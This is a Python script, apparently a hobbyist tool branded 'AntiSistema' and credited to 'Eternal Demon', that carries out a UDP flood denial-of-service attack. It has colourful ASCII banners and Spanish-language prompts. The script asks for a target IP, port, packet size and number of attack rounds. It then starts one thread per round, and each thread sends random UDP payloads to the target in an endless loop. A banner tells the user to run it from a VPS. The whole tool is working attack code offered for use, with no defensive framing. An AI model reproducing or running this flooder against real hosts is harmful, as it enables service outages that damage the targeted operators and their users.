import colorama
from colorama import *
init(autoreset=True)
try:
    import threading
    import socket
    import random
    import sys
    import os
    import time
    from time import sleep
    #Code Time
    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year
    
except ImportError as e:
    print(f"{Fore.RED}[ERROR] {Fore.LIGHTYELLOW_EX} {e}")
    sys.exit()
os.system("clear")
def welcome():
    print(f"""
{Fore.GREEN}
╦══════════════════════════════════════╗    
║ ╦ ╦  ╔═╗  ╦    ╔═╗  ╔═╗  ╔╦╗  ╔═╗    ║
║ ║║║  ║╣   ║    ║    ║ ║  ║║║  ║╣     ║
║ ╚╩╝  ╚═╝  ╩═╝  ╚═╝  ╚═╝  ╩ ╩  ╚═╝    ║
╩══════════════════════════════════════╝
{Fore.LIGHTYELLOW_EX}Made by Eternal Demon

    
{Fore.YELLOW} {Back.RED} --> Pls run this script in a VPS <--""")
def banner():
    print(f"""
{Fore.LIGHTCYAN_EX}  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  {Fore.RED} ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
{Fore.LIGHTCYAN_EX} ▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ {Fore.RED}▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌
{Fore.LIGHTCYAN_EX} ▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌     ▐░▌ ▀▀▀▀█░█▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  {Fore.RED} ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀█░▌
{Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌▐░▌    ▐░▌     ▐░▌          ▐░▌     ▐░▌           {Fore.RED}     ▐░▌     ▐░▌               ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌
{Fore.LIGHTCYAN_EX} ▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌     ▐░▌          ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄  {Fore.RED}     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌
{Fore.LIGHTCYAN_EX} ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌     ▐░▌          ▐░▌     ▐░░░░░░░░░░░▌ {Fore.RED}     ▐░▌     ▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
{Fore.LIGHTCYAN_EX} ▐░█▀▀▀▀▀▀▀█░▌▐░▌   ▐░▌ ▐░▌     ▐░▌          ▐░▌      ▀▀▀▀▀▀▀▀▀█░▌ {Fore.RED}     ▐░▌      ▀▀▀▀▀▀▀▀▀█░▌     ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀█░▌
{Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌    ▐░▌▐░▌     ▐░▌          ▐░▌               ▐░▌ {Fore.RED}     ▐░▌               ▐░▌     ▐░▌     ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌
{Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌     ▐░▐░▌     ▐░▌      ▄▄▄▄█░█▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌ {Fore.RED} ▄▄▄▄█░█▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌▐░▌       ▐░▌
{Fore.LIGHTCYAN_EX} ▐░▌       ▐░▌▐░▌      ▐░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ {Fore.RED}▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌
{Fore.LIGHTCYAN_EX}  ▀         ▀  ▀        ▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  {Fore.RED} ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀ 
                                                    {Fore.LIGHTYELLOW_EX}Made by Eternal Demon


{Fore.MAGENTA}                                                                         ██╗  ██╗  
{Fore.MAGENTA}╔═╗  ╔═╗  ╦ ╦  ╔═╗  ╦═╗  ╔═╗  ╦ ╦  ╦    ╦         ╦  ┌─┐┬ ┬┌─┐┬─┐        ██║  ██║
{Fore.MAGENTA}╠═╝  ║ ║  ║║║  ║╣   ╠╦╝  ╠╣   ║ ║  ║    ║         ║  ├─┤└┬┘├┤ ├┬┘        ███████║
{Fore.MAGENTA}╩    ╚═╝  ╚╩╝  ╚═╝  ╩╚═  ╚    ╚═╝  ╩═╝  ╩═╝       ╩═╝┴ ┴ ┴ └─┘┴└─        ╚════██║ 
{Fore.MAGENTA}                                                                              ██║
{Fore.MAGENTA} """)
def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(f"\033[1;34m[AntiSistema {index}] \033[0m\xBB \033[1;35m{size}\033[0m Paquetes Enviados \033[1;35m{ip}\033[0m")

def main():
    try:
        if sys.version_info[0] != 3:
            print("{Fore.RED}[ERROR] {Fore.LIGHTYELLOW_EX} Esta script esta diseñada en Python3 ejecutelo en esa version :) ATT: Tu chinito")
            sys.exit()
        
        if len(sys.argv) < 5:
            welcome()
            time.sleep(4)
            os.system('clear')
            banner()

        IP       = input("\033[1;34m[>] \033[2;32mIP:  \xBB \033[0m") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("\033[1;34m[>] \033[2;32mPuerto:  \xBB \033[0m")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE     = int(input("\033[1;34m[>] \033[2;32mNumero de Paquetes:  \xBB \033[0m")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT    = int(input("\033[1;34m[>] \033[2;32mNumero de rondas de Ataque:  \xBB \033[0m")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 65535 or PORT < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB ELIJA UN PUERTO ENTRE EL 1 Y EL 65535")
            sys.exit(1)

        if SIZE > 65500 or SIZE < 1:
            print("\n\033[1;31m[ERROR] \033[0m\xBB ELIJA UN NUMERO DE PAQUETES ENTRE EL 1 Y EL 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        sys.exit()
    
    except Exception as e:
        print(f"\n\033[1;31m[ERROR] \033[0m\xBB {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"\n\033[1;31m[ERROR] \033[0m\xBB {i}: {e}")            

if __name__ == "__main__":
    main()

